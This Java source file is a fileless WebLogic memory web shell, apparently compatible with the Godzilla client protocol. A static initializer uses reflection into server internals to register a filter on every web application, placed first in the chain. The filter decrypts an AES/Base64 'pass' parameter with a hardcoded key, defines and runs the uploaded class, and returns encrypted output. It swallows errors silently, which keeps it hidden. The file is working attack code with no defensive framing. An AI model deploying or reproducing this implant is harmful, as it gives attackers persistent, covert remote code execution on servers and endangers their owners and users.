import javax.servlet.*;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.*;
import java.util.*;

//weblogic 10.3.6 - weblogic 14
public class AesBase64WeblogicFilterShell extends ClassLoader implements Filter {
    private static boolean initialized = false;
    private static final Object lock = new Object();
    private static Class payloadClass;
    String key = "3c6e0b8a9c15224a";
    String password = "pass";


    static {
        new AesBase64WeblogicFilterShell();
    }

    public AesBase64WeblogicFilterShell(ClassLoader loader){
        super(loader);
    }

    public AesBase64WeblogicFilterShell(){
        synchronized (lock){
            if (!initialized){
                initialized = true;
                try {
                    addFilter(this.getClass());
                }catch (Throwable e){

                }
            }
        }
    }

    public static Object[] getContextsByMbean() throws Throwable {
        HashSet webappContexts = new HashSet();
        Class serverRuntimeClass = Class.forName("weblogic.t3.srvr.ServerRuntime");
        Class webAppServletContextClass = Class.forName("weblogic.servlet.internal.WebAppServletContext");
        Method theOneMethod = serverRuntimeClass.getMethod("theOne");
        theOneMethod.setAccessible(true);
        Object serverRuntime = theOneMethod.invoke(null);

        Method getApplicationRuntimesMethod = serverRuntime.getClass().getMethod("getApplicationRuntimes");
        getApplicationRuntimesMethod.setAccessible(true);
        Object applicationRuntimes = getApplicationRuntimesMethod.invoke(serverRuntime);
        int applicationRuntimeSize = Array.getLength(applicationRuntimes);
        for (int i = 0; i < applicationRuntimeSize; i++) {
            Object applicationRuntime =  Array.get(applicationRuntimes,i);

            try {
                Method getComponentRuntimesMethod = applicationRuntime.getClass().getMethod("getComponentRuntimes");
                Object componentRuntimes = getComponentRuntimesMethod.invoke(applicationRuntime);
                int componentRuntimeSize = Array.getLength(componentRuntimes);
                for (int j = 0; j < componentRuntimeSize; j++) {
                    Object context = getFieldValue(Array.get(componentRuntimes,j),"context");
                    if (webAppServletContextClass.isInstance(context)){
                        webappContexts.add(context);
                    }
                }
            }catch (Throwable e){

            }

            try {
                Set childrenSet = (Set) getFieldValue(applicationRuntime,"children");
                Iterator iterator = childrenSet.iterator();

                while (iterator.hasNext()){
                    Object componentRuntime = iterator.next();
                    try {
                        Object context = getFieldValue(componentRuntime,"context");
                        if (webAppServletContextClass.isInstance(context)){
                            webappContexts.add(context);
                        }
                    }catch (Throwable e){

                    }
                }

            }catch (Throwable e){

            }
        }
        return webappContexts.toArray();
    }
    public static Object[] getContextsByThreads()throws Throwable{
        HashSet webappContexts = new HashSet();
        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
        int threadCount = threadGroup.activeCount();
        Thread[] threads = new Thread[threadCount];
        threadGroup.enumerate(threads);
        for (int i = 0; i < threadCount; i++) {
            Thread thread = threads[i];
            if (thread!=null){
                Object workEntry = getFieldValue(thread,"workEntry");
                if (workEntry!=null){
                    try {
                        Object context = null;
                        Object connectionHandler = getFieldValue(workEntry,"connectionHandler");
                        if (connectionHandler!=null){
                            Object request = getFieldValue(connectionHandler,"request");
                            if (request!=null){
                                context = getFieldValue(request,"context");
                            }
                        }
                        if (context == null){
                            context = getFieldValue(workEntry,"context");
                        }

                        if (context!=null){
                            webappContexts.add(context);
                        }
                    }catch (Throwable e){

                    }
                }
            }
        }
        return webappContexts.toArray();
    }
    public static Object[] getContexts() {
        HashSet webappContexts = new HashSet();
        try {
            webappContexts.addAll(Arrays.asList(getContextsByMbean()));
        }catch (Throwable e){

        }
        try {
            webappContexts.addAll(Arrays.asList(getContextsByThreads()));
        }catch (Throwable e){

        }
        return webappContexts.toArray();
    }

    public static boolean addFilter(Class filterClass){
        boolean isOK = false;
        Object[] contexts = getContexts();
        for (int i = 0; i < contexts.length; i++) {
            try {
                Object webContext = contexts[i];

                Method getFilterManagerMethod = webContext.getClass().getMethod("getFilterManager");
                getFilterManagerMethod.setAccessible(true);

                Method getServletClassLoaderMethod = webContext.getClass().getMethod("getServletClassLoader");
                getServletClassLoaderMethod.setAccessible(true);

                Object servletClassLoader = getServletClassLoaderMethod.invoke(webContext);
                Object filterManager = getFilterManagerMethod.invoke(webContext);
                Map cachedClasses = (Map)getFieldValue(servletClassLoader,"cachedClasses");


                //或者直接反射在这个classloader定义类 就不用写缓存了 不过就要硬编码一个class了
                cachedClasses.put(filterClass.getName(),filterClass);

                //String filterName, String filterClassName, String[] urlPatterns, String[] servletNames, Map initParams, String[] dispatchers
                Method registerFilterMethod = filterManager.getClass().getDeclaredMethod("registerFilter", String.class, String.class, String[].class, String[].class, Map.class, String[].class);
                registerFilterMethod.setAccessible(true);
                registerFilterMethod.invoke(filterManager, filterClass.getName(), filterClass.getName(), new String[]{"/*"}, null, null, new String[]{"REQUEST","FORWARD","INCLUDE","ERROR"});


                //将我们的filter置为第一位
                List filterPatternList = (List) getFieldValue(filterManager,"filterPatternList");
                Object currentMapping = filterPatternList.remove(filterPatternList.size() - 1);
                filterPatternList.add(0,currentMapping);
                isOK = true;
            }catch (Throwable e){

            }
        }
        return isOK;
    }

    public static Field getField(Object obj, String fieldName){
        Class clazz = null;

        if(obj == null){
            return null;
        }

        if (obj instanceof Class){
            clazz = (Class)obj;
        }else {
            clazz = obj.getClass();
        }
        Field field = null;
        while (clazz!=null){
            try {
                field = clazz.getDeclaredField(fieldName);
                clazz = null;
            }catch (Exception e){
                clazz = clazz.getSuperclass();
            }
        }

        if (field != null){
            field.setAccessible(true);
        }

        return field;
    }
    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field f=null;
        if (obj instanceof Field){
            f=(Field)obj;
        }else {
            f = getField(obj, fieldName);
        }
        if (f != null) {
            return f.get(obj);
        }
        return null;
    }


    public byte[] aes(byte[] s,boolean m){
        try{
            javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");
            c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(key.getBytes(),"AES"));
            return c.doFinal(s);
        }catch (Exception e){
            return null;
        }
    }

    public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; }

    public static String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[] {
                    byte[].class
            }).invoke(Encoder, new Object[] {
                    bs
            });
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[] {
                        byte[].class
                }).invoke(Encoder, new Object[] {
                        bs
                });
            } catch (Exception e2) {}
        }
        return value;
    }
    public static byte[] base64Decode(String bs) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[] {
                    String.class
            }).invoke(decoder, new Object[] {
                    bs
            });
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[] {
                        String.class
                }).invoke(decoder, new Object[] {
                        bs
                });
            } catch (Exception e2) {}
        }
        return value;
    }


    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        String contentType = servletRequest.getContentType();
        try {
            if (contentType!=null && contentType.contains("application/x-www-form-urlencoded")) {
                String value = servletRequest.getParameter(password);
                if (value!=null){
                    byte[] data = base64Decode(value);
                    data = aes(data, false);
                    if (data != null && data.length > 0){
                        if (payloadClass == null) {
                            ClassLoader loader = Thread.currentThread().getContextClassLoader();
                            if (loader == null) {
                                loader = servletRequest.getClass().getClassLoader();
                            }
                            payloadClass =  new AesBase64WeblogicFilterShell(loader).defineClass(data,0,data.length);
                        } else {
                            java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                            Object f = payloadClass.newInstance();
                            f.equals(arrOut);
                            f.equals(servletRequest);
                            f.equals(data);
                            f.toString();
                            String md5 = md5(password + key);
                            if (arrOut.size()>0) {
                                PrintWriter printWriter = servletResponse.getWriter();
                                printWriter.write(md5.substring(0, 16));
                                printWriter.write(base64Encode(aes(arrOut.toByteArray(), true)));
                                printWriter.write(md5.substring(16));
                                return;
                            }
                        }
                    }
                }
            }
        }catch (Throwable e){

        }
        filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void destroy() {

    }
}
